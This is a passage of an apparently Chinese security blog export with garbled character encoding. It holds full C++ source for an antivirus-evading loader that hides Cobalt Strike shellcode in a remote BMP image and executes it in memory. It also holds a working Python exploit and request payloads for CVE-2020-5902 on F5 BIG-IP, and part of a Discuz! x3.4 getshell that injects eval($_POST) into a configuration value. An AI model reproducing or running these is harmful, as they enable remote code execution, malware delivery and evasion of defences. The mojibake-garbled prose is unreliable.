¹æ®exeè¿è¡Œè¿‡ç¨‹ä¸­è¾“å‡ºçš„ä¸€äº›æç¤ºè¯­ï¼Œæ‰¾åˆ°åè¿›å»ï¼Œè¿™ä¸ªå¤§éƒ¨åˆ†éƒ½æ˜¯ï¼ŒåŒå‡»ä¸€ä¸ªä¸­æ–‡è¿›å…¥Hex Viewï¼Œå¦‚ä¸‹ç•Œé¢ ç„¶åå³é”®edit ï¼Œéšä¾¿è¾“å…¥ä¸€äº›ä¸œè¥¿ å³é”®Apply changes ç„¶åç‚¹å‡» Edit -&gt; Patch program -&gt; Apply patches to input file... -&gt; å‡ºç°çš„ç•Œé¢ç‚¹ok ç»“æœæ²¡æœ‰é—®é¢˜ï¼Œå¯ä»¥è¿è¡Œ ","link":"https://www.svenbeast.com/post/yan-jiu-mou-zhong-chang-jing-bypassav/"},{"title":"ã€å­¦ä¹ ã€‘å›¾ç‰‡éšå†™shellcodeè¿›è¡Œè¿œç¨‹åŠ è½½è¿‡AV","content":"0x01 å‚è€ƒé“¾æ¥ https://mp.weixin.qq.com/s/QZ5YlRZN47zne7vCzvUpJw https://www.t00ls.net/redirect-57618.html#lastpost 0x02 å­¦ä¹ æ€è·¯ æ”¹åŠ¨ï¼šä¿®æ”¹äº†åŸexeæ‰§è¡Œåå­˜åœ¨æ§åˆ¶å°ç°è±¡ï¼Œç›®å‰æ˜¯æ§åˆ¶å°è‡ªåŠ¨æ¶ˆå¤±åå°é™é»˜æ‰§è¡Œ 1. CSç”ŸæˆCçš„shellcodeï¼Œä½¿ç”¨Pythonè¿›è¡ŒHexç¼–ç  2. å°†Hexç¼–ç æ³¨å…¥åˆ°bmpå›¾ç‰‡çš„æ–‡ä»¶å¤´ 3. å›¾ç‰‡ä¸Šä¼ åˆ°å…¬ç½‘,æ­¤å¤„ä¸ºé˜¿é‡Œçš„å¯¹è±¡å­˜å‚¨ossé‡Œ 3. è·å¾—å›¾ç‰‡ï¼Œè§£æå‡ºshellcodeåæ‰§è¡Œ 0x03 ä»0åˆ°1çš„å‰æœŸå‡†å¤‡ 1. å®‰è£…Visual Studio 2019 ï¼Œ\bè¿™ä¸ªéœ€è¦äº›æ—¶é—´å®‰è£…ä¸€äº›ä¾èµ–åº“ï¼Œæ¨èä¸“ä¸šç‰ˆï¼Œå¯ä»¥æœç´¢å®‰è£…æ•™ç¨‹ç…§åšå³å¯ https://visualstudio.microsoft.com/zh-hans/vs/ https://www.cnblogs.com/hsjj/p/VisualStudio.html 2. å¼€é€šé˜¿é‡Œäº‘å¯¹è±¡å­˜å‚¨OSSæœåŠ¡ ç™»å½•é˜¿é‡Œäº‘-æ§åˆ¶å°-å¯¹è±¡å­˜å‚¨-å¼€é€šæˆåŠŸ-åˆ›å»ºBucket(ä¿®æ”¹ä¸ºå…¬å…±è¯»ï¼Œå…¶ä»–é»˜è®¤) 3. CSç”Ÿæˆshellcodeï¼Œå°†payload.cé‡Œçš„shellcodeä½¿ç”¨pythonè¿›è¡ŒHexç¼–ç  4. getImgshellcode.exe åšå¥½ç”Ÿæˆå‡†å¤‡ï¼Œæ­¤exeåŠŸèƒ½æ˜¯å°†shellcodeæ³¨å…¥bmpå›¾ç‰‡æ–‡ä»¶ Githubï¼šhttps://github.com/sv3nbeast/ImgLoaderShellCode æ ¸å¿ƒä»£ç  #include &quot;dwBmpSize.h&quot; #include &lt;iostream&gt; using namespace std; CBMPHide::CBMPHide() { sBmpFileName = &quot;&quot;; pBuf = 0; dwBmpSize = 0; ptxtBuf = 0; pExEBuf = 0; } CBMPHide::~CBMPHide() { } bool CBMPHide::setBmpFileName(char* szFileName) { this-&gt;sBmpFileName = szFileName; if (pBuf) //å¦‚æœå·²ç»ç”Ÿæˆå°±é‡Šæ”¾æ‰ { delete[]pBuf; } HANDLE hfile = CreateFileA(szFileName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, 0); if (hfile == INVALID_HANDLE_VALUE) { return false; } //å’Œstruct BITMAPFILEHEADER bmfhé‡Œé¢çš„ bfSizeçš„å¤§å°åº”è¯¥æ˜¯ä¸€æ ·çš„ã€‚ dwBmpSize = GetFileSize(hfile, 0); //è·å–æ–‡ä»¶çš„å¤§å° pBuf = new byte[dwBmpSize + 83968]; DWORD dwRead = 0; ReadFile(hfile, pBuf, dwBmpSize, &amp;dwRead, 0); if (dwRead != dwBmpSize) { delete[]pBuf; pBuf = 0; return false; } CloseHandle(hfile); m_fileHdr = (BITMAPFILEHEADER*)pBuf; m_infoHdr = (BITMAPINFOHEADER*)(pBuf + sizeof(BITMAPFILEHEADER)); return true; //æˆåŠŸè¯å°±æ˜¯æ–‡ä»¶çš„å†…å®¹è¯»å–åˆ°pBufé‡Œé¢ } int CBMPHide::getBmpWidth() { return m_infoHdr-&gt;biWidth; } int CBMPHide::getBmpHeight() { return m_infoHdr-&gt;biHeight; } int CBMPHide::getBmpBitCount() { return m_infoHdr-&gt;biBitCount; } bool CBMPHide::save() { string sDstFileName = &quot;save.bmp&quot;; HANDLE hfile = CreateFileA(sDstFileName.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, 0, 0); if (hfile == INVALID_HANDLE_VALUE) { return false; } DWORD dwWritten = 0; WriteFile(hfile, pBuf, dwBmpSize + 83968, &amp;dwWritten, 0); if (dwBmpSize != dwWritten) { return false; } CloseHandle(hfile); return true; } //éšè—ä¸€ä¸ªå­—ç¬¦ä¸²åˆ°å›¾ç‰‡ä¸­ï¼ŒæŠŠå­—ç¬¦ä¸²æ‹†æˆå­—èŠ‚ï¼Œå†™å…¥æ¯ä¸ªåƒç´ çš„alphaé€šé“ä¸­ bool CBMPHide::hideString2BMP(char* szStr2Hide) { LPBYTE pAlpha = pBuf + m_fileHdr-&gt;bfOffBits + 3; //ç¬¬ä¸€ä¸ªåƒç´ çš„é€šé“ä½ç½® //cout &lt;&lt; pAlpha &lt;&lt; endl; int nHide; //æˆåŠŸéšè—çš„å­—èŠ‚æ•° //æ¯æ¬¡å¾ªç¯å†™å…¥ä¸€ä¸ªå­—èŠ‚ï¼Œå¸å…¥alphaé€šé“ //(pAlpha - pBuf) &lt; m_fileHdr-&gt;bfSizeè¿™ä¸ªæ˜¯åˆ¤æ–­å­—ç¬¦ä¸²æ˜¯å¤ªå¤§ï¼Œå›¾ç‰‡ä¸èƒ½éšè— for (nHide = 0; (pAlpha - pBuf) &lt; m_fileHdr-&gt;bfSize &amp;&amp; szStr2Hide[nHide] != 0; nHide++, pAlpha += 4) { //cout &lt;&lt; nHide &lt;&lt; endl; *pAlpha = szStr2Hide[nHide]; //å†™å…¥ä¸€ä¸ªå­—èŠ‚ //cout &lt;&lt; pAlpha &lt;&lt; endl; } return true; } void CBMPHide::showStringInBmp(char* szBmpFIleName/*=NULL*/) { string sDstFileName = &quot;save.bmp&quot;; sDstFileName = szBmpFIleName; HANDLE hfile = CreateFileA(sDstFileName.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, 0); if (hfile == INVALID_HANDLE_VALUE) { return; } DWORD dwSize = GetFileSize(hfile, 0); LPBYTE pBuf1 = new byte[dwSize]; DWORD dwRead = 0; ReadFile(hfile, pBuf1, dwSize, &amp;dwRead, 0); CloseHandle(hfile); //æ–‡ä»¶å†…å®¹è¯»å–åˆ°pBuf1ä¸­ BITMAPFILEHEADER* pHdr = (BITMAPFILEHEADER*)pBuf1; LPBYTE pStr = pBuf1 + pHdr-&gt;bfOffBits + 3; char szTmp[1280]; RtlZeroMemory(szTmp, 1280); for (int i = 0; i &lt; 1280; i++) { if (*pStr == 0 || *pStr == 0xFF) { break; } szTmp[i] = *pStr; pStr += 4; } printf_s(szTmp); delete[]pBuf1; } int main(int argc, char* argv[]) { if (argc &lt; 2) { wprintf(L&quot;Command: %S &lt;SHELLCODE&gt; ...\\n&quot;, argv[0]); return -1; } CBMPHide hide; hide.setBmpFileName((char*)&quot;test.bmp&quot;); printf_s(&quot;test.bmp width:%d,height:%d,bitCount%d\\n&quot;, hide.getBmpWidth(), hide.getBmpHeight(), hide.getBmpBitCount()); char* shellcode = argv[1]; hide.hideString2BMP((char*)shellcode); hide.save(); cout &lt;&lt; shellcode &lt;&lt; endl; } 1. ShellcodeImg.exe åšå¥½ç”Ÿæˆå‡†å¤‡ï¼Œæ­¤exeåŠŸèƒ½æ˜¯è·å¾—è¿œç¨‹å›¾ç‰‡ï¼Œæ‰§è¡Œshellcode Githubï¼šhttps://github.com/sv3nbeast/ImgLoaderShellCode æ ¸å¿ƒä»£ç  #include &lt;stdio.h&gt; #include &lt;Windows.h&gt; #include &lt;Winhttp.h&gt; #include &lt;WinDNS.h&gt; #include &lt;iterator&gt; #include &lt;iostream&gt; #include &lt;windows.h&gt; #include &lt;WinDNS.h&gt; #include &lt;string&gt; #include &lt;vector&gt; #pragma comment(lib,&quot;Winhttp.lib&quot;) #pragma comment(lib,&quot;urlmon.lib&quot;) using namespace std; struct CachedDnsRecord { wstring name; int type; }; #define INET_ADDRSTRLEN 22 #define INET6_ADDRSTRLEN 65 typedef void(*DownLoadCallback)(int ContentSize, int CUR_LEN); typedef struct _URL_INFO { WCHAR szScheme[512]; WCHAR szHostName[512]; WCHAR szUserName[512]; WCHAR szPassword[512]; WCHAR szUrlPath[512]; WCHAR szExtraInfo[512]; }URL_INFO, * PURL_INFO; void dcallback(int ContentSize, int file_size) { //printf(&quot;count:%d,size:%d\\n&quot;, ContentSize, file_size); } void download(const wchar_t* Url, const wchar_t* FileName, DownLoadCallback Func) { URL_INFO url_info = { 0 }; URL_COMPONENTSW lpUrlComponents = { 0 }; lpUrlComponents.dwStructSize = sizeof(lpUrlComponents); lpUrlComponents.lpszExtraInfo = url_info.szExtraInfo; lpUrlComponents.lpszHostName = url_info.szHostName; lpUrlComponents.lpszPassword = url_info.szPassword; lpUrlComponents.lpszScheme = url_info.szScheme; lpUrlComponents.lpszUrlPath = url_info.szUrlPath; lpUrlComponents.lpszUserName = url_info.szUserName; lpUrlComponents.dwExtraInfoLength = lpUrlComponents.dwHostNameLength = lpUrlComponents.dwPasswordLength = lpUrlComponents.dwSchemeLength = lpUrlComponents.dwUrlPathLength = lpUrlComponents.dwUserNameLength = 512; WinHttpCrackUrl(Url, 0, ICU_ESCAPE, &amp;lpUrlComponents); HINTERNET hSession = WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_NO_PROXY, NULL, NULL, 0); DWORD dwReadBytes, dwSizeDW = sizeof(dwSizeDW), dwContentSize, dwIndex = 0; HINTERNET hConnect = WinHttpConnect(hSession, lpUrlComponents.lpszHostName, lpUrlComponents.nPort, 0); HINTERNET hRequest = WinHttpOpenRequest(hConnect, L&quot;HEAD&quot;, lpUrlComponents.lpszUrlPath, L&quot;HTTP/1.1&quot;, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_REFRESH); WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0); WinHttpReceiveResponse(hRequest, 0); WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER, NULL, &amp;dwContentSize, &amp;dwSizeDW, &amp;dwIndex); WinHttpCloseHandle(hRequest); hRequest = WinHttpOpenRequest(hConnect, L&quot;GET&quot;, lpUrlComponents.lpszUrlPath, L&quot;HTTP/1.1&quot;, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_REFRESH); WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0); WinHttpReceiveResponse(hRequest, 0); BYTE* pBuffer = NULL; pBuffer = new BYTE[dwContentSize]; ZeroMemory(pBuffer, dwContentSize); do { WinHttpReadData(hRequest, pBuffer, dwContentSize, &amp;dwReadBytes); Func(dwContentSize, dwReadBytes); } while (dwReadBytes == 0); //cout &lt;&lt; pBuffer &lt;&lt; endl; BITMAPFILEHEADER* pHdr = (BITMAPFILEHEADER*)pBuffer; LPBYTE pStr = pBuffer + pHdr-&gt;bfOffBits + 3; char szTmp[1900]; RtlZeroMemory(szTmp, 1900); for (int i = 0; i &lt; 1900; i++) { if (*pStr == 0 || *pStr == 0xFF) { break; } szTmp[i] = *pStr; pStr += 4; } unsigned int char_in_hex; unsigned int iterations = strlen(szTmp); unsigned int memory_allocation = strlen(szTmp) / 2; VirtualProtect(szTmp, memory_allocation, PAGE_READWRITE, 0); for (unsigned int i = 0; i &lt; iterations / 2; i++) { sscanf_s(szTmp + 2 * i, &quot;%2X&quot;, &amp;char_in_hex); szTmp[i] = (char)char_in_hex; } void* abvc = VirtualAlloc(0, memory_allocation, MEM_COMMIT, PAGE_READWRITE); memcpy(abvc, szTmp, memory_allocation); DWORD ignore; VirtualProtect(abvc, memory_allocation, PAGE_EXECUTE, &amp;ignore); (*(void(*)()) abvc)(); delete pBuffer; WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); } typedef struct _DNS_CACHE_ENTRY { struct _DNS_CACHE_ENTRY* pNext; // Pointer to next entry PWSTR pszName; // DNS Record Name unsigned short wType; // DNS Record Type unsigned short wDataLength; // Not referenced unsigned long dwFlags; // DNS Record Flags } DNSCACHEENTRY, * PDNSCACHEENTRY; typedef int(WINAPI* DNS_GET_CACHE_DATA_TABLE)(PDNSCACHEENTRY); vector&lt;CachedDnsRecord&gt; getDnsCache() { vector&lt;CachedDnsRecord&gt; results; PDNSCACHEENTRY pEntry = (PDNSCACHEENTRY)malloc(sizeof(DNSCACHEENTRY)); HINSTANCE hLib = LoadLibrary(TEXT(&quot;DNSAPI.dll&quot;)); DNS_GET_CACHE_DATA_TABLE DnsGetCacheDataTable = (DNS_GET_CACHE_DATA_TABLE)GetProcAddress(hLib, &quot;DnsGetCacheDataTable&quot;); int stat = DnsGetCacheDataTable(pEntry); pEntry = pEntry-&gt;pNext; while (pEntry) { CachedDnsRecord record; record.name = wstring(pEntry-&gt;pszName); record.type = pEntry-&gt;wType; results.push_back(record); pEntry = pEntry-&gt;pNext; } free(pEntry); if (!results.empty()) { download(L&quot;https://code.oss-cn-beijing.aliyuncs.com:80/save.bmp&quot;, L&quot;1633Music&quot;, &amp;dcallback); } else { exit(0); } return results; } int main() { HWND hwndDOS = GetForegroundWindow(); ShowWindow(hwndDOS, SW_HIDE); auto cache = getDnsCache(); return 0; } 0x04 å¼€å§‹è¿è¡Œ 1. å°†ä»»æ„.bmpå›¾ç‰‡æ–‡ä»¶æ”¹æˆtest.bmpæ”¾å…¥ç”Ÿæˆçš„getImgshellcode.exeåŒç›®å½•,å¹¶ä¸”å¤åˆ¶ç”Ÿæˆå¥½çš„Hexç¼–ç åçš„shellcodeï¼Œè¿›è¡Œæ³¨å…¥,åŒç›®å½•ç”Ÿæˆsave.bmp 2. ä¸Šä¼ save.bmpåˆ°é˜¿é‡ŒOSSé‡Œï¼Œç‚¹å‡»ä¸Šä¼ çš„å›¾ç‰‡è·å¾—è®¿é—®URLå¹¶å¤åˆ¶ 3. ç”ŸæˆShellcodeImg.exeï¼Œå…ˆä¿®æ”¹176è¡Œçš„å›¾ç‰‡åœ°å€ä¸ºä¸Šæ­¥éª¤çš„URLåœ¨ç”Ÿæˆ 4. åœ¨å…¬ç½‘vpsæ¨¡æ‹ŸçœŸå®ç¯å¢ƒè¿è¡ŒAVæƒ…å†µä¸‹æ‰§è¡ŒShellcodeImg.exeï¼Œå¹¶æœªé­åˆ°æ‹¦æˆªï¼Œä¸”æˆåŠŸæ‰§è¡Œå‘½ä»¤ 0x05 &quot;å¯èƒ½&quot;ä¼šæœ‰ç”¨çš„å°çŸ¥è¯† 1. \b\bå¦‚æœæƒ³è¦åœ¨å…¶ä»–æœºå™¨è¿è¡ŒæˆåŠŸVSç”Ÿæˆçš„exeæ—¶ï¼Œç”Ÿæˆæ—¶è¦é€‰æ‹©Releaseï¼Œä¸ºäº†å…¼å®¹æ€§é€‰æ‹©x86ï¼Œç„¶åç”Ÿæˆå³å¯ 2. VSå»ºé€ çš„é¡¹ç›®æ–‡ä»¶å¤¹éƒ½ä¼šå­˜åœ¨.slnæ–‡ä»¶ï¼ŒåŒå‡».slnæ–‡ä»¶å³å¯è‡ªåŠ¨æ‰“å¼€æ•´ä¸ªé¡¹ç›®ï¼Œè¿˜åŸé¡¹ç›®æœ¬èº« 0x06 &quot;å¯èƒ½&quot;ä¼šé‡åˆ°çš„é—®é¢˜ 1. exeæ‰§è¡Œåæ— æ³•æ­£å¸¸ä¸Šçº¿ï¼ŒåŸå› å¯èƒ½æ˜¯å¡«å…¥å›¾ç‰‡URLçš„æ—¶å€™æ²¡æœ‰åŠ å…¥ç«¯å£ï¼Œå¯¼è‡´å¹¶æœªæˆåŠŸä¸‹è½½å›¾ç‰‡è§£æï¼Œå¦‚å›¾å°±æ˜¯æ²¡æœ‰å†™ç«¯å£å¯¼è‡´è¿è¡Œæ—¶å¹¶æœªæˆåŠŸè·å¾—å›¾ç‰‡è¿›è¡Œè§£æ æ­£ç¡®ï¼šhttps://code.oss-cn-beijing.aliyuncs.com:80/save.bmp é”™è¯¯ï¼šhttps://code.oss-cn-beijing.aliyuncs.com/save.bmp ã€å¯æ”¹è¿›çš„åœ°æ–¹ã€‘: ç°åœ¨çš„æ“ä½œæ˜¯è¿è¡Œexeåç”Ÿæˆæ§åˆ¶å°ç„¶åå…³é—­æ§åˆ¶å°æ“ä½œï¼Œä¼šæœ‰æ§åˆ¶å°é—ªä¸€ä¸‹ç„¶åæ¶ˆå¤±çš„ç•Œé¢ï¼Œè¿‡ç¨‹è™½ç„¶å¾ˆå¿«ï¼Œä½†å¯¹é…ç½®ä½çš„æœºå™¨è¿˜æ˜¯æœ‰æ„Ÿçš„ï¼Œå¦‚æœæ·»åŠ è¿è¡Œexeåä¸å‡ºç°æ§åˆ¶å°ä¹Ÿå°±æ˜¯ä¸å‡ºç°çª—å£ç›´æ¥éšè—åå°é™é»˜æ‰§è¡Œçš„ä»£ç ç”Ÿæˆåä¼šè¢«AVæ£€æµ‹æŸ¥æ€ï¼Œå¸Œæœ›ä»¥åæœ‰å¸ˆå‚…è¿›è¡Œæ”¹è¿›å§ 0.0 ! å¯èƒ½ä¼šæœ‰äººæ„Ÿè§‰å†™å¾—å•°å—¦~ å…¶å®æ˜¯å› ä¸ºæœ¬äººä¹Ÿæ˜¯è‡ªå·±å­¦ä¹ ï¼Œéƒ½æ˜¯æ‘¸ç´¢ç€æ¥ï¼Œæ‰€ä»¥å¯¹ä¸€äº› &quot;å‘&quot; çš„åŸºç¡€å°é—®é¢˜å¾ˆæ•æ„Ÿï¼Œå› ä¸ºåœ¨å®Œå…¨ä¸ä¼šçš„æƒ…å†µä¸‹é‡åˆ°å…¶å®éƒ½è¿˜è›®æ‡µçš„ï¼ŒåŒæ ·é—®é¢˜å¯¹ä¸åŒçš„äººæ¥è¯´éš¾åº¦ç¡®å®æ˜¯ä¸ä¸€æ ·çš„ï¼Œæ‰€ä»¥ï¼Œæˆ‘è¿˜æ˜¯èµ¶ç´§è¡®å»ç»§ç»­å­¦ä¹ å§ ","link":"https://www.svenbeast.com/post/xue-xi-tu-pian-yin-xie-shellcode-jin-xing-yuan-cheng-jia-zai-guo-av/"},{"title":"CVE-2020-5902 BIG-IP RCE  ç»•è¿‡tmshé™åˆ¶å‘½ä»¤æ‰§è¡Œ&EXPç¼–å†™","content":"0x01 èƒŒæ™¯ æœ€è¿‘ F5 Networksçš„ç½‘ç»œå’Œå®‰å…¨äº§å“BIG IPåº”ç”¨äº¤ä»˜æ§åˆ¶å™¨æ›å‡ºæ¼æ´ï¼Œæ˜¨å¤©æ™šä¸Š10ç‚¹æ—¶æœ‰äººåœ¨æ¨ç‰¹å‘å¸ƒäº†POCï¼Œéšå³å°è¯•è·Ÿè¿›æ­¤æ¼æ´å¹¶ç¼–å†™EXPã€‚ 0x02 POC twitter: https://twitter.com/x4ce/status/1279790599793545216 Read File Example: /tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd GET /tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd HTTP/1.1 Host: 127.0.0.1 Connection: close Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,ar;q=0.8 Cookie: JSESSIONID=89E562018185E75966F67E7FC50CF6E1 F5 RCE Example: /tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user GET /tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user HTTP/1.1 Host: 127.0.0.1 Connection: close Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,ar;q=0.8 Cookie: JSESSIONID=07E7975B5F6F4B43F3375AA5FFB32628 0x03 å°è¯•æ‰§è¡Œå‘½ä»¤ æ­¤å¤„æ€è·¯æ˜¯åˆ©ç”¨aliasç»•è¿‡tmshé™åˆ¶ï¼Œå­¦ä¹ è‡ªmsfè„šæœ¬ï¼Œç›®å‰è¿˜æœªåˆå¹¶åˆ°msfä¸­ ä¿®æ”¹alias ï¼Œå°†listè®¾ç½®æˆbashå‘½ä»¤ htts://x.x.x.x/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash ç”Ÿæˆbashæ–‡ä»¶å¹¶å†™å…¥è¦æ‰§è¡Œçš„å‘½ä»¤ htts://x.x.x.x/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/checksafe&amp;content=whoami æ‰§è¡Œbashæ–‡ä»¶ htts://x.x.x.x/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/checksafe è¿˜åŸaliasè®¾ç½®ï¼Œé˜²æ­¢å½±å“ç›®æ ‡æ­£å¸¸ä½¿ç”¨ https://x.x.x.x/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list Example: è¿™æ˜¯å‘½ä»¤æˆåŠŸæ‰§è¡Œåçš„å›æ˜¾ï¼Œæ­¤å¤„æ‰§è¡Œçš„æ˜¯whoamiå‘½ä»¤ 0x04 EXP ç¼–å†™ä¸€ä¸ªexpè„šæœ¬ä»¥ä¾¿ä»¥åç¢°åˆ°åèŠ‚çœæ—¶é—´ Github: https://github.com/sv3nbeast/CVE-2020-5902_RCE import requests #by æ–¯æ–‡ import sys import json requests.packages.urllib3.disable_warnings() banner= ''' ______ _______ ____ ___ ____ ___ ____ ___ ___ ____ / ___\\ \\ / / ____| |___ \\ / _ \\___ \\ / _ \\ | ___|/ _ \\ / _ \\___ \\ | | \\ \\ / /| _| _____ __) | | | |__) | | | |____|___ \\ (_) | | | |__) | | |___ \\ V / | |__|_____/ __/| |_| / __/| |_| |_____|__) \\__, | |_| / __/ \\____| \\_/ |_____| |_____|\\___/_____|\\___/ |____/ /_/ \\___/_____| by æ–¯æ–‡ ''' headers = { 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36' } def check(url, cmd): try: print('[+ å¼€å§‹æµ‹è¯•ç›®æ ‡: {} å‘½ä»¤: {}'.format(url,cmd)) del_alias = url + '/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list' creat_alias = url + '/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash' write_bash = url + '/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/checksafe&amp;content={}'.format(cmd) exec_bash = url + '/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/checksafe' print('[+ æ­£åœ¨è¿˜åŸaliasè®¾ç½®ï¼Œé˜²æ­¢å…¶ä»–äººæœªä¿®æ”¹å›æ¥') x = requests.get(del_alias,headers=headers,verify=False,timeout=30) print('[+ æ­£åœ¨å°†listå‘½ä»¤åŠ«æŒä¸ºbash') y = requests.get(creat_alias,headers=headers,verify=False,timeout=30) print('[+ æ­£åœ¨å†™å…¥bashæ–‡ä»¶') z = requests.get(write_bash,headers=headers,verify=False,timeout=30) print('[+ æ­£åœ¨æ‰§è¡Œå‘½ä»¤,è¯·æŸ¥çœ‹outputå­—æ®µå€¼'+'\\n') g = requests.get(exec_bash,headers=headers,verify=False,timeout=30) requests.get(del_alias,headers=headers,verify=False,timeout=30) text = g.content.decode('utf-8') print(text.strip('\\n')) except: print('[- è¯·æŸ¥çœ‹ç›®æ ‡æ˜¯å¦å¯ä»¥æ­£å¸¸è®¿é—®') if __name__ == &quot;__main__&quot;: try: url = sys.argv[1] cmd = sys.argv[2] if url[-1] == '/':url=url[0:-1] print(banner) check(url=url,cmd=cmd) except Exception as e: # print(e) print('python3 CVE-2020-5902.py http://x.x.x.x whoami') 0x05 å‘ç‚¹ åœ¨æ‰§è¡Œå‰å¯å°è¯•å…ˆè¿˜åŸä¸€éaliasçš„è®¾ç½®ï¼Œé˜²æ­¢listå‘½ä»¤å·²è¢«ç¯¡æ”¹ æ–‡ä»¶è¯»å–å’ŒRCEæ˜¯ä¸¤ä¸ªå•ç‹¬çš„æ¼æ´ï¼Œä¸æ˜¯è¯´å­˜åœ¨æ–‡ä»¶è¯»å–å°±ä¼šå­˜åœ¨RCEï¼Œä¸¤è€…å½±å“ç‰ˆæœ¬ä¸åŒ ","link":"https://www.svenbeast.com/post/cve-2020-5902-big-ip-rce-rao-guo-tmsh-xian-zhi-ming-ling-zhi-xing-andexp-bian/"},{"title":"Discuz!x3.4 åå°ä¿®æ”¹UCenteré…ç½®getshell","content":"0x01 èƒŒæ™¯ 2020å¹´5æœˆ20æ—¥ã€‚ã€‚ã€‚ å¸®æœ‹å‹æµ‹è¯•æ—¶é‡åˆ°äº†discuz!x3.4ï¼Œç”±æ­¤è®°å½•ä¸€ä¸‹ï¼Œæ„Ÿè°¢QAX A-teamçš„å¹²è´§å¸–å­æ‹‰~ æœ€è¿‘é€šè¿‡æœ‹å‹æ¨èï¼Œæ¢äº†æœ¬å­0.0 ï¼Œæœ‰ç‚¹ä¸é€‚åº”ï¼Œå„ç§å®‰è½¯ä»¶å®‰ç¯å¢ƒç„¶ååˆæ”¹äº†åšå®¢æ ·å¼ï¼Œç»ˆäºå¯ä»¥å‘æ–‡ç« æ‹‰ å¯¹æ–°æœ¬å­çš„é¢œå€¼å’Œé€Ÿåº¦å¾ˆæ»¡æ„ï¼Œé™„å›¾å°å°çš„ç§€ä¸€æŠŠ 0x02 ä¸»é¢˜ ç¯å¢ƒæ­å»ºï¼šwindows+phpstudy+Discuz!x3.4 Discuz!x3.4ï¼šhttps://github.com/sv3nbeast/discuz-x3.4-RCE 0x03 åˆ©ç”¨ è¿›å…¥åå°ç«™é•¿-UCenterè®¾ç½®ï¼Œä¿®æ”¹UCenteré€šä¿¡å¯†é’¥ä¸º123456å¹¶è®°å½•ä¸‹æ¥ï¼Œå¡«å…¥code.phpï¼Œä¿®æ”¹UC_API=http://192.168.0.106/discuz!x3.4/uc_server');eval($_POST[sven]);//ï¼Œç‚¹å‡»ä¿å­˜ ç”Ÿæˆcodeå‚æ•°çš„å€¼(code.phpä»£ç è§æœ«å°¾) ç”Ÿæˆcodeå€¼ &lt;?php $uc_key=&quot;123456&quot;;//æ­¤å¤„å¡«å†™åˆšæ‰UCenterè®¾ç½®çš„å€¼ $time = time() + 720000; $str = &quot;time=&quot;.$time.&quot;&amp;action=updateapps&quot;; $code = authcode($str,&quot;ENCODE&quot;,$uc_key); $code = str_replace('+','%2b',$code); $code = str_replace('/','%2f',$code); echo $code; function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) { $ckey_length = 4; $key = md5($key != '' ? $key : '123456'); $keya = md5(substr($key, 0, 16)); $keyb = md5(substr($key, 16, 16)); $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : ''; $cryptkey = $keya.md5($keya.$keyc); $key_length = strlen($cryptkey); $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string; $string_length = strlen($string); $result = ''; $box = range(0, 255); $rndkey = array(); for($i = 0; $i &lt;= 255; $i++) { $rndkey[$i] = ord($cryptkey[$i % $key_length]); } 